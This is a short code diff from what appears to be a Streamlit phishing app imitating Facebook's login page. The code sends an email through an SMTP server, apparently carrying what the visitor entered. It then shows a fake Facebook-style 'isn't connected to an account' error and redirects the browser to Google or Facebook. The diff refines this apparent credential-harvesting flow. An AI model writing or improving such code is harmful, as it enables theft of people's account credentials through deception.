@@ -105,11 +105,13 @@ with col2:
                     server.login(sender, password)
                     server.send_message(msg)
                     server.quit()
-                    url = "https://www.facebook.com/"
-                    webbrowser.open(url)
                 except Exception as e:
                     st.error(f"❌ Failed to send email: {e}")
                     st.error("The email address or mobile number you entered isn't connected to an account.")
+
+                finally:
+                    url = "https://www.google.com/"
+                    webbrowser.open(url)
             
 
 
@@ -126,3 +128,4 @@ with col2:
         
         url = "https://www.facebook.com/r.php?entry_point=login"
         webbrowser.open(url)
+
